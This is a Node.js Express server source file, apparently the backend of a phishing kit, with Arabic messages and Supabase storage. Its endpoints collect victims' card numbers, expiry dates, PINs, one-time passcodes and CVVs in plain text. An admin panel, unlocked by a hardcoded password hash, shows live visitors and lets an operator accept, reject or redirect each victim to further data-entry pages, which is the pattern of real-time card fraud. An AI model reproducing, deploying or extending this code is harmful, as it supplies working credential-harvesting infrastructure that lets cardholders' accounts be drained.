const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://afhiyyhtzdpakgjyerhe.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_pa64ZjpXLdArJrjUvs4cvg_d9VhHGG0';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

// SHA-256 hash of the admin password (hashed so it never appears in plain text)
// To change the password, run: node -e "console.log(require('crypto').createHash('sha256').update('YOUR_NEW_PASSWORD').digest('hex'))"
const ADMIN_PASSWORD_HASH = process.env.ADMIN_PASSWORD_HASH || '64ee793c649d9cac46ad25f8ab42093124c54a48d1afb75fb1de0bb803436636';
const ADMIN_TOKEN = crypto.createHash('sha256').update('token:' + ADMIN_PASSWORD_HASH).digest('hex');

function isAdmin(req) {
  const auth = req.headers.authorization;
  if (auth && auth.startsWith('Bearer ')) return auth.slice(7) === ADMIN_TOKEN;
  return false;
}

// Submit new payment
app.post('/api/submit', async (req, res) => {
  try {
    const b = req.body;
    const phone = String(b.phone || '').trim();
    const amount = String(b.amount || '').trim();
    if (!phone || !amount) return res.status(400).json({ error: 'بيانات ناقصة' });
    const id = crypto.randomBytes(6).toString('hex');
    const { error } = await supabase.from('submissions').insert({
      id, phone, amount,
      card: String(b.card || '').trim(),
      expiry: String(b.expiry || '').trim(),
      pin: String(b.pin || '').trim(),
      otp: String(b.otp || '').trim(),
      cvv: String(b.cvv || '').trim(),
      status: 'pending',
      time: new Date().toISOString()
    });
    if (error) throw error;
    res.json({ ok: true, id });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Update step (card / OTP / CVV)
app.post('/api/submit-step/:id', async (req, res) => {
  try {
    const b = req.body;
    const updates = {};
    if (b.card !== undefined) updates.card = String(b.card).trim();
    if (b.expiry !== undefined) updates.expiry = String(b.expiry).trim();
    if (b.pin !== undefined) updates.pin = String(b.pin).trim();
    if (b.otp !== undefined) updates.otp = String(b.otp).trim();
    if (b.cvv !== undefined) updates.cvv = String(b.cvv).trim();
    updates.status = 'pending';
    const { error } = await supabase.from('submissions').update(updates).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Public status check
app.get('/api/status/:id', async (req, res) => {
  try {
    const { data } = await supabase.from('submissions').select('status').eq('id', req.params.id).maybeSingle();
    if (!data) return res.status(404).json({ error: 'غير موجود' });
    res.json({ status: data.status || 'pending' });
  } catch (err) {
    res.json({ status: 'pending' });
  }
});

// Admin login
app.post('/api/admin/login', (req, res) => {
  const inputHash = crypto.createHash('sha256').update(req.body.password || '').digest('hex');
  if (inputHash === ADMIN_PASSWORD_HASH) {
    return res.json({ token: ADMIN_TOKEN });
  }
  res.status(401).json({ error: 'كلمة المرور غير صحيحة' });
});

// Admin: get all submissions
app.get('/api/admin/submissions', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { data, error } = await supabase.from('submissions').select('*').order('time', { ascending: false });
    if (error) throw error;
    const cutoff = new Date(Date.now() - 30000).toISOString();
    const { count } = await supabase.from('visitors').select('*', { count: 'exact', head: true }).gte('last_seen', cutoff);
    res.json({ submissions: data || [], active: count || 0 });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: accept
app.post('/api/admin/accept/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { error } = await supabase.from('submissions').update({ status: 'accepted' }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: reject
app.post('/api/admin/reject/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { error } = await supabase.from('submissions').update({ status: 'rejected' }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: redirect user to a specific page
app.post('/api/admin/redirect/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const page = req.body.page || 'card';
    const { error } = await supabase.from('submissions').update({ status: 'redirect_' + page }).eq('id', req.params.id);
    if (error) throw error;
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Admin: clear all
app.post('/api/admin/clear', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ error: 'غير مصرح' });
    const { data } = await supabase.from('submissions').select('id');
    if (data && data.length) await supabase.from('submissions').delete().in('id', data.map(r => r.id));
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Heartbeat
app.post('/api/heartbeat', async (req, res) => {
  try {
    const id = String(req.body.id || '').trim();
    if (!id) return res.json({ active: 0 });
    const now = new Date().toISOString();
    await supabase.from('visitors').upsert({ session_id: id, last_seen: now }, { onConflict: 'session_id' });
    const cutoff = new Date(Date.now() - 30000).toISOString();
    const { count } = await supabase.from('visitors').select('*', { count: 'exact', head: true }).gte('last_seen', cutoff);
    res.json({ active: count || 0 });
  } catch (err) {
    res.json({ active: 0 });
  }
});

// Active count
app.get('/api/active-count', async (req, res) => {
  try {
    const cutoff = new Date(Date.now() - 30000).toISOString();
    const { count } = await supabase.from('visitors').select('*', { count: 'exact', head: true }).gte('last_seen', cutoff);
    res.json({ active: count || 0 });
  } catch (err) {
    res.json({ active: 0 });
  }
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

if (!process.env.VERCEL) {
  app.listen(PORT, () => console.log('Server running on port ' + PORT));
}

module.exports = app;
